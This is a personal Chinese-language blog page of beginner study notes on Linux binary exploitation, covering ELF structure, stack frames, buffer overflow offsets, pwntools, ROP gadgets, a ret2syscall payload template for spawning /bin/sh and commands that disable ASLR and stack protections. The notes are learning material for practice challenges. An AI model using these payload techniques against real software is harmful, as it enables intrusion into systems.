@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>纲的blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="纲的blog">
+<meta property="og:url" content="https://2023478.github.io/index.html">
+<meta property="og:site_name" content="纲的blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="wgiegie">
+<meta property="article:tag" content="Wgiegie">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="纲的blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">纲的blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Suche"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://2023478.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-博客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/27/%E5%8D%9A%E5%AE%A2/" class="article-date">
+  <time class="dt-published" datetime="2024-03-27T11:15:02.303Z" itemprop="datePublished">2024-03-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>一vim</strong></p>
+<p>vim是我们在使用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Linux&spm=1001.2101.3001.7020">Linux</a>是经常会使用的工具，新手总是忘记使用方法（当然我也是）。在这里记录下常用命令以防止以后再忘记</p>
+<p>1，进入编辑模式： i （在当前位置插入，开始编辑）；</p>
+<p>2,保存编辑文本： :w (英文冒号，保存当前编辑的文件）；</p>
+<p>3,退出编辑文件： :q（英文冒号，退出当前编辑的文件）；</p>
+<p>4,保存并退出： :wq （英文冒号，保存并退出当前编辑的文件）；</p>
+<p>5.强制退出：  :q! （英文冒号，强制退出不保存）。</p>
+<p>.在vim命令行下输入from</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6,:%!xxd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>“%!”为调用第三方操作对vim内容进行操作，如 :%!tr a-z A-Z 把全文小写字母改成大写。<br>xxd 命令可以为给定的标准输入或者文件做一次十六进制的输出，它也可以将十六进制输出转换为原来的二进制格式，即将任意文件转换为十六进制或二进制形式。</p>
+</blockquote>
+<p>所以，使用命令之后，会把文档改成十六进制显示。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span>,:%!xxd <span class="literal">-r</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>xxd -r 逆向操作:把十六进制转储转换成二进制形式。如果不输出到标准输出,xxd并不把输出文件截断,而是直接写到输出文件。</p>
+</blockquote>
+<p>9,file+文件名，用于识变文件是什么类型的文件，（与文件的后缀无关），同时也通过这个判断是什么文件x32，x64</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wzg@wzg-virtual-machine:~$ file text.c</span><br><span class="line">text.c: C source, ASCII text</span><br></pre></td></tr></table></figure>
+
+<p>10,text.c是一个C语言源代码，ascll编码的文本</p>
+<p>11,rm+文件名，删除那个文件</p>
+<p>12,gcc -S 文件名，可以将文件改为汇编语言文件</p>
+<p>13，<code>checksec +文件名</code>，查看文件是否有保护程序</p>
+<p>![屏幕截图 2023-11-24 205006](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-24 205006.png)</p>
+<p>PIE：•程序的防护措施，</p>
+<p>编译时生效，随机化ELF文件的映射地址，</p>
+<p>开启 ASLR 之后，PIE 才会生效。</p>
+<p>NX•程序与操作系统的防护措施，编译时决定是否生效，由操作系统实现，</p>
+<p>通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃。</p>
+<p>canary：•程序的防护措施，编译时生效</p>
+<p>•在刚进入函数时，在栈上放置一个标志canary，在函数返回时检测其是否被改变。以达到防护栈溢出的目的，*.canary长度为1字长，其位置不一-&#x2F;14578定与ebp&#x2F;rbp存储的位置相邻，具体得看程序的汇编操作。</p>
+<p>RELRO：•程序的防护措施，编译时生效</p>
+<p>•部分 RELRO: 在程序装入后, 将其中一些段(如.dynamic)标记为只读, 防止程序的一些重定位信息被修改</p>
+<p>•完全 RELRO: 在部分 RELRO 的基础上, 在程序装入时, 直接解析完所有符号并填入对应的值, 此时所有的 GOT 表项都已初始化, 且不装入link_map与_dl_runtime_resolve的地址。</p>
+<p>![屏幕截图 2023-11-18 193922](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-18 193922.png)</p>
+<p>可执行文件</p>
+<p>广义：文件中的数据是可执行代码的文件.out、.exe、.sh、.py</p>
+<p>狭义：文件中的数据是机器码的文件.out、.exe、.dll、.so</p>
+<p>分类：</p>
+<p>Windows：PE（Portable Executable）可执行程序.exe动态链接库.dll静态链接库.lib</p>
+<p>Linux：ELF（Executable and Linkable Format）可执行程序.out动态链接库.so静态链接库.a</p>
+<p><img src="/(C:%5CUsers%5Cx%5CPictures%5CScreenshots%5CScreenshots%5C%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="image-20231118202418867"></p>
+<p>•ELF文件头表（ELF header）</p>
+<p>•记录了ELF文件的组织结构</p>
+<p>给系统看</p>
+<p>•</p>
+<p>•程序头表&#x2F;段表（Program header table）</p>
+<p>•告诉系统如何创建进程</p>
+<p>•生成进程的可执行文件必须拥有此结构</p>
+<p>•重定位文件不一定需要</p>
+<p>•</p>
+<p>•节头表（Section header table）&#x2F;&#x2F;用来组织elf文件春村</p>
+<p>•记录了ELF文件的节区信息</p>
+<p>•用于链接的目标文件必须拥有此结构</p>
+<p>其它类型目标文件不一定</p>
+<p>•代码段（Text segment）包含了代码与只读数据</p>
+<p>•.text 节&#x2F;&#x2F;</p>
+<p>•.rodata 节 </p>
+<p>•.hash 节 </p>
+<p>•.dynsym 节 </p>
+<p>•.dynstr 节 </p>
+<p>•.plt 节&#x2F;&#x2F;</p>
+<p>•.rel.got 节 </p>
+<p>•……</p>
+<p>•数据段（Data segment）包含了可读可写数据</p>
+<p>•.data 节 </p>
+<p>•.dynamic 节 </p>
+<p>•.got 节 </p>
+<p>•.got.plt 节&#x2F;&#x2F;用于保存plt节中的代码解析到实际的动态连接的函数的地址</p>
+<p>•.bss 节&#x2F;&#x2F;只在内存中占空间不在磁盘中占有空间</p>
+<p>•……</p>
+<p>•栈段（Stack segment）</p>
+<p>![屏幕截图 2023-11-19 102459](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-19 102459.png)</p>
+<p>kemel，内核</p>
+<p>starck堆栈</p>
+<p>shared libraries，共享库</p>
+<p>heap堆，动态存储区，malloc在程序执行后才有的空间在其中</p>
+<p>unused未使用 </p>
+<p>text代码段：main函数，sum函数，具体实现的机械码都放在其中，会有一些不可写的代码</p>
+<p>data段会存放已初始化的全局变量，str</p>
+<p>bss段存放未初始化的全局变量，glb（不占用内存空间）</p>
+<p>![屏幕截图 2023-11-19 105211](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-19 105211.png)</p>
+<p>小端序：数据从左往右，存的时候从下到上</p>
+<p>​     </p>
+<p>•RIP</p>
+<p>•存放当前执行的指令的地址</p>
+<p>•RSP</p>
+<p>•存放当前栈帧的栈顶地址</p>
+<p>•RBP</p>
+<p>•存放当前栈帧的栈底地址</p>
+<p>•RAX</p>
+<p>•通用寄存器。存放函数返回值</p>
+<p>栈（stack）：地址从高地址往低地址增长（从上往下），</p>
+<p>堆（heap）：地址从低地址往高地址增长（从下往上），</p>
+<p>在栈和堆中有shared libraries（共享库），且大小为止，通过两者不同的增长方向使其充分利用空间</p>
+<p> ![屏幕截图 2023-11-19 114829](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-19 114829.png)</p>
+<p>high address高地址；caller’s Function state函数功能状态;stack top顶端;low address低地址</p>
+<p>![屏幕截图 2023-11-19 120035](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-19 120035.png)</p>
+<p>•函数状态主要涉及三个寄存器 —— esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。</p>
+<p>ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</p>
+<p>eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
+<p>•下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。</p>
+<p>•首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。</p>
+<p><img src="C:\Users\x\AppData\Roaming\Typora\typora-user-images\image-20231119143141350.png" alt="image-20231119143141350"></p>
+<p>​                                    将被调用函数的参数压入栈内</p>
+<p>high address高地址；low address低地址；return address回信地址；stack top顶端；caller访客；</p>
+<p>function state功能状态;</p>
+<p>（1）esp：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</p>
+<p>（2）ebp：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p>
+<p>在栈中ebp常常保存着的是上一个函数的返回值，用于在栈使用完后返回之前的函数，在栈顶</p>
+<p>其中的值是一个指针指向原来的函数的栈低。</p>
+<p>在ebp的更高一位地址有一个更为重要的域：return address![屏幕截图 2023-11-20 210719](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-20 210719.png)</p>
+<p>当一个域的函数执行完其中的代码开始执行return前，会先将栈中的esp移到与ebp相同的指向地址并指向这里</p>
+<p>之后由于ebp中存放的是上一个函数的返回值，ebp便通过这个地址指向上一个函数栈顶，同时存放再上一个函数的返回值，与此同时esp自动加一指向return address；</p>
+<p>在ebp和esp中有一个变量可以由我们向其中输入无限的变量，那我们便可通过输入的数据将ebp指向的上面的数据覆盖，然后在程序执行时，到返回地址时由于已经被我们写入的数据覆盖，会直接返回我们写入的地址，从而达到我们的目标，在ida中我们可以先找到那个变量，便可以看到他与ebp和esp的距离，如：char s;&#x2F;&#x2F; [esp+1ch] [ebp-64h]（可能会出现错误，如果有错用动态调试）,我们可以看到此时的s变量距离ebp是0x64字节，当我们向其中写入0x64个字节的数据便可以到ebp的位置，在向上写4个字节便可以覆盖ebp指向的位置，在写4个字节便是要返回的话数值，于是我们只要想s中写入0x68字节的垃圾数据和0x4个字节的特殊数据便可以在函数执行后不正常反悔而是返回到我们需要的值。</p>
+<p>通过sub   esp，空间大小           确定栈的空间大小；</p>
+<p>esp始终指向栈顶，ebp是在堆栈中寻址用的</p>
+<p><strong>栈帧</strong>也叫过程活动记录，是编译器用来实现过程&#x2F;函数调用的一种数据结构。简言之，<strong>栈帧</strong>就是利用<code>EBP</code>（栈帧指针，<strong>请注意不是ESP</strong>）寄存器访问局部变量、参数、函数返回地址等</p>
+<p><strong>栈溢出</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">8</span>];</span><br><span class="line">read(<span class="number">0</span>,str,<span class="number">24</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上面那个程序中str在main函数中栈有8个字节的缓冲区，通过read函数输入值进入str中</p>
+<p>在机械执行的过程先将ebq入栈，用于固定返回位置，但是在输入值时由于超出str的区域，使得原本用于返回的值被覆盖，当程序执行到那时不在返回原本应该返回的值，从而出现错误。</p>
+<p>00</p>
+<p>传参：</p>
+<p>•x86</p>
+<p>•使用栈来传递参数</p>
+<p>•使用 eax 存放返回值</p>
+<p>•amd64</p>
+<p>•前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中</p>
+<p>•第7个以后的参数存放于栈中</p>
+<p>nc+网址 用于远程链接 </p>
+<p><strong>pwntools</strong></p>
+<p>在python中 先输入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure>
+
+<p>导入环境，通过</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./文件名&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>与本地的程序建立一个链接，并获的pid：进程号（文件要是可执行文件）；通过</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = remote(<span class="string">&quot;ip&quot;</span>,端口)</span><br></pre></td></tr></table></figure>
+
+<p>与远程端口链接。吧“</p>
+<p>在于端口连接后需要接送端口传来的数据可以通过</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.recvline()</span><br></pre></td></tr></table></figure>
+
+<p>接收传来的一行数据，但只能是一行，</p>
+<p>若要向端口传输数据，需注意由于是端口只能传输数据流，需进行特殊处理</p>
+<p>传整数，根据传输对象加上p32（）或者p64（），在字符串前加上b(“”)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">12</span>+p32(<span class="number">0x75834</span>))<span class="comment">//也可以换send但要在字符串后加\n</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;程序的输出&#x27;</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>若端口在接收数据后会返回程序通过</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.recv()</span><br></pre></td></tr></table></figure>
+
+<p>一般在最后会加上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.interactive() 允许我们在终端里将命令传送到远程服务器. Pwntools 会自动接收输出并回显 .</span><br></pre></td></tr></table></figure>
+
+<p>接收端口的返回</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(b<span class="string">&quot;;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>以为接收程序发的数据直到；这个符号为止</p>
+<p>写Python脚本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">    ...</span><br><span class="line">io.interactive()    </span><br></pre></td></tr></table></figure>
+
+<p>写好之后用python +这个文件名</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *地址&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>用于在程序进行之中时，进入调试状态。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;main_real_addr:&quot;</span>,main_real_addr)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>ljust() 方法将使用指定的字符（默认为空格）作为填充字符使字符串左对齐</p>
+<ul>
+<li><p><input disabled="" type="checkbox"> 
+在pwntools中shellcraft.sh   shellcode      elf.search，ljust</p>
+</li>
+<li><p><input disabled="" type="checkbox"> </p>
+<h5 id="函数栈的工作方式，rope链的构造，动态链接的解析过程"><a href="#函数栈的工作方式，rope链的构造，动态链接的解析过程" class="headerlink" title="函数栈的工作方式，rope链的构造，动态链接的解析过程&#x3D;"></a>函数栈的工作方式，rope链的构造，动态链接的解析过程&#x3D;</h5></li>
+</ul>
+<p>在pwntools中shellcraft.sh</p>
+<p>在文件中可以通过如下代码链接，从而对文件中的部分数据进行分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&quot;./文件名&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如果在文件中有puts函数，可以通过如下代码查看puts函数在got表像中的地址（）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hex(elf.got[<span class="string">&quot;puts&quot;</span>])/不加hex（）则打印出来的是十进制数字，hex将十进制转化为<span class="number">16</span>进制</span><br><span class="line">next(elf.search(b<span class="string">&quot;/bin/sh&quot;</span>))    </span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>动态调试</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb 文件名（必须是可执行的文件a.out）</span><br></pre></td></tr></table></figure>
+
+<p>进入调试出现pwndbg&gt;标志吧</p>
+<p>b+断点，然后r开始调式</p>
+<p>start，程序将停在main函数的第一行，或程序的入口第一条指令。</p>
+<p>backtrace显示·整个函数的函数调用栈的状况，由上到下调用，下调用上。</p>
+<p>return直接回到main函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> #!/bin/sh</span><br><span class="line"><span class="number">2</span> </span><br><span class="line"><span class="number">3</span> gcc -fno-<span class="built_in">stack</span>-protector -z exestack -no-pie -g -o wwww wwww.c </span><br></pre></td></tr></table></figure>
+
+<p>gcc -fno-stack-protector关闭canary</p>
+<p>canary保护</p>
+<p>当栈被创立的时候会在ebp的下面放上一个随机值，在程序执行到返回时先检查那个随机值是否正确。不正会直接停止运算</p>
+<p>-z exestack打开栈的可执行权限</p>
+<p>-no-pie,关闭pie</p>
+<p>pie 将elf文件的本体和载入地址都随机化（text，data，bss区的地址）</p>
+<p>-g可以在调式时代上源代码，但要在最后加上源代码文件</p>
+<p>-o输出文件的名字</p>
+<p>在保存后用chmod +x 文件名，为文件赋权</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<p>修改发送的栈的地址是不是随机值，正常情况下&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space的值为2，若要此时的栈地址则会得到的是一个随机值，修改为0后将称为一个定值，可以通过cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space知道其值为多少，</p>
+<p>![屏幕截图 2023-11-21 211454](C:\Users\x\Pictures\Screenshots\Screenshots\Screenshots\屏幕截图 2023-11-21 211454.png)</p>
+<p>通过动态调试，可以知道我们输入的AAA在一开始入栈的地址为0x7fffffffdeb0,而ebp指向的为0x7fffffffdf20，距离是160个字节，故我们要填充的是160+8（x64系统为8个）垃圾数据然后的8个为需要执行的数据，</p>
+<p>在攻击前由于程序是x64需通过一下指令在pwntools中修改</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch =<span class="string">&quot;amd64&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>ldd 文件名（必须为可执行的文件名），查看该文件用到的所有动态链接库，如图</p>
+<p>![屏幕截图 2023-11-21 220537](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-21 220537.png)</p>
+<p>其中要重点关注的是第二行，libc.so.6是软链接相当于快捷方式的值指向的是lib中的存放C语言的动态链接库</p>
+<p>动态链接库本身就是一个可执行文件，他也有可执行的入口 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary yichu --only <span class="string">&quot;pop|ret&quot;</span>，？</span><br></pre></td></tr></table></figure>
+
+<p>在yichu这个可执行文件中寻找为pop，ret的汇编代码</p>
+<p>在文件名搜system，</p>
+<p>int 0x80,中断号代表进行系统调用，调用系统函数时，函数名一般为sys_write（），但是我们不能直接用他的名称只能在调用时用代号，如sys_write()代号为4，sys_execve()代号11,0xb，可以用0xb直接调用sys_execve()</p>
+<p>在使用int 0x80，要确保（eax&#x3D;0xb,ebx&#x3D;0x8048xxxx,ecx&#x3D;0,edx&#x3D;0）这4个寄存器都已经完成初始化，eax中的0xb代表的是系统函数的调用代（0xb-&gt;sys_execve()）,ebx中存放的是我们最后要执行到的最后地址，如、bin&#x2F;sh&#x2F;的地址</p>
+<p>![屏幕截图 2024-01-07 155233](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2024-01-07 155233.png)</p>
+<p>payload&#x3D;b’A’*112(垃圾数据)+p64(pop_eax_ret)+p64(0xb)+p64(pop_edx_ecx_ebx_ret)+p64(0)+p64(0)+p64(bin_sh)+p64(int_80h)[其中的pop_eax_ret，pop_edx_ecx_ebx_ret，bin_sh，int_80h都要在程序中找到地址并在程序之前写明]</p>
+<p>![屏幕截图 2023-11-22 213524](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-22 213524.png)</p>
+<p>![屏幕截图 2023-11-23 150419](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-23 150419.png)</p>
+<p>在linux中可以生成的可执行文件分为动态链接文件和静态链接文件，用gcc默认生成的是动态链接，用file分析会出现dynamically linke的标志，其中不含有C语言的基本执行代码只有经过编译后的源码，在执行时与系统链接使用C语言的基本代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --<span class="type">static</span> 文件名</span><br></pre></td></tr></table></figure>
+
+<p> 当执行以上代码时会生成静态链接的文件，用file分析是会有statically linke的标志，其中包含有C              语言的基本执行代码。 </p>
+<p>![屏幕截图 2023-11-23 152644](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-23 152644.png)</p>
+<p>![屏幕截图 2023-11-23 153131](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-23 153131.png)</p>
+<p>.got 保存了整个程序的虚拟内存空间中各个符号（变量）的偏移量（地址）</p>
+<p>.got.plt保存的是函数的地址</p>
+<p>●.dynamic section</p>
+<p>○提供动态链接相关信息，为操作系统描述整个动态链接的所用内容包括其他的表的位置等等</p>
+<h4 id="●link-map"><a href="#●link-map" class="headerlink" title="●link_map"></a>●link_map</h4><p>○保存进程载入的动态链接库的链表</p>
+<p>●__dl_runtime_resolve</p>
+<p>○装载器中用于解析动态链接库中函数的实际址的函数</p>
+<p><strong>动态链接的过程![屏幕截图 2023-11-23 164625](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-23 164625.png)</strong></p>
+<p>1，第一次进行链接</p>
+<p>在程序中先定义一个foo函数</p>
+<p>代码段首次调用foo，跳转到 .plt 中的 foo 函数项，.plt 中的代码会使程序立即跳转到 .got.plt 中记录的地址</p>
+<p>由于进程是第一次调用 foo，故 .got.plt 中记录的地址是 foo@plt+1，于是会跳转到plt中的下一段代码，先将index入栈，index包括的是foo这个函数的在我们程序的位置（第几个函数），然后是跳转到PLT0段</p>
+<p>在PLT0中再将一个数入栈，这个数指的是用到的是哪一个动态链接库，之后进行跳转，到_dl_runtime_resolve函数，这个函数将解析 foo 的真正地址填入 .got.plt 中</p>
+<p>此后 .got.plt 中保存的是 foo 的真实地址</p>
+<p>![屏幕截图 2023-11-23 165300](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-11-23 165300.png)</p>
+<p>之后的调用到.got.plt处时便可以直接拿到foo的真实地址</p>
+<p>栈对齐，ret的加入，call的入栈使其对齐</p>
+<p><strong>ida基操</strong></p>
+<p>ida中shift+F12查找字符串 </p>
+<p>g可直接跳转到某个地址</p>
+<p>n 可以替换字符名称</p>
+<p>h 可以将数字从10进制转为16进制</p>
+<p>context.arch&#x3D;”amd64”</p>
+<p>print(asm(shellcraft.amd64.sh()))（</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax rax, <span class="number">0xb</span> <span class="number">0x3b</span></span><br><span class="line">mov ebx rdi, [“/bin/sh”] </span><br><span class="line">mov ecx rsi, <span class="number">0</span></span><br><span class="line">mov edx rdx, <span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="number">0x80</span> syscall</span><br><span class="line">=&gt; execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在静态链接中，在系统内核中的execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)这个函数可以获得控制权，但由于他是内核函数，所以，在调用它时必须满足一些必要的调用约定才可以进行调用，</p>
+<p>像这些系统内核函数调用必须使用一些特殊的汇编指令才能调用，如int 80（32位）和syscall（64位）就像一个call函数，但是是跳转到内核系统中，至于要跳到哪个函数则要根据之前部分寄存器的值来确定，eax(32)和rax(64)保存了系统调用号（内核函数在内核中都有独属于自己一个调用号，如execve的调用号为11（32位&#x3D;0xb）,59（64位&#x3D;0x3b））,ebx和rdi用来保存在函数中执行的参数的地址，同时要保证ecx，edx和rsi，rdx中的值都为0。</p>
+<p>![屏幕截图 2023-12-03 112959](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-12-03 112959.png)</p>
+<p>对于在动态链接中调用一个在plt段上的函数，先在ida中的plt段中找到需要调用的函数的地址，在栈溢出之后直接来到plt段的函数进行调用，需要注意的是在调用plt段中函数时由于函数会先创造一个独属于自己的栈，虽然这个栈不用关注，但由于这个栈的存在，在payload中plt函数不会直接读取下一个地址而是读取下下个地址，如get@plt会用的的是buf2的地址不会用中间的那一个。</p>
+<p>如果我们在使用时，需要平衡栈空间，便需要消除栈中的数据，对于get下的一个数据get会在最后进行消除，但buf2段不会被消除，此时便需要一个pop|ret的值在中间加入进去，对buf2的值进行消除，对于pop|ret的选择，最后选择通用寄存器入ebx等对程序不会起到大作用的寄存器加进去。</p>
+<p>以上的方法主要适用于在32位中的程序中，如果在64位的程序中，由于函数不会直接调用栈中的参数，在64位的系统中参数的前6个会分别存放在rdi、rsi、rdx、rcx、r8、r9 寄存器中，之后的才会放在栈中，同样的函数调用也是相同的，于是只要在函数执行前将函数调用的参数放在那6个寄存器中（一般函数调用一个参数时，更多的是将rdi的值修改为所需参数在的地址。相同的像gets这种输入的函数，先将rdi的值改为bss段中的空地址，于是输入的值便会直接将存放在那个bss段中，在后期调用时，将rdi中的值改为那个地址，然后直接将程序跳plt段中的函数地址，便会直接调用rdi中的地址的参数，执行函数。）</p>
+<p>![屏幕截图 2023-12-03 152037](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-12-03 152037.png)</p>
+<p>![屏幕截图 2023-12-03 151541](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-12-03 151541.png)![屏幕截图 2023-12-03 151922](C:\Users\x\Pictures\Screenshots\Screenshots\屏幕截图 2023-12-03 151922.png)</p>
